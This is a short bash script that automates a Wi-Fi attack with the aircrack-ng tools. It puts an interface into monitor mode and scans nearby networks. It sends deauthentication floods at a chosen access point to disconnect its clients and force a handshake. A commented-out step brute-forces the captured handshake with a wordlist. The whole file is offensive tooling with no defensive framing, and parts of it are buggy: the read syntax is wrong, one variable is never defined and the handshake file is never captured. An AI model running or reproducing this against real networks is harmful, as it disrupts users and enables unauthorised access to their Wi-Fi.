#! /bin/bash

monitor(){
	airmon-ng check kill
	echo "Available network interfaces"
	iwconfig 
	read -p "Select interface : " interface
	airmon-ng start $interface
}

airodump()
{
	echo "Collecting near-by Wi-Fi"
	echo "Press ctrl+c after 10 seconds"
	airodump-ng $interface > test.txt 
	echo "Available Wi-Fis"
	cat test.txt
	read -p "Enter the MAC address of  access point (BSSID): " bssid
	echo $bssid  
	read -p "enter the access point channel: " channel
	read -p "Enter the name for output : " output
	mkdir $output
	aireplay-ng --deauth 20 -a $bssid $interface &
}

aircrack()
{
	aireplay-ng --deauth 0 -a  $id wlan0mon
	echo -ne "enter the wordlist for brute forcing:  "
	read $wordlist 
	echo "enter the handshake.cap file path"
	read $file
	aircrack-ng  -b $bssid -w $wordlist $file

}

monitor
airodump
#aircrack
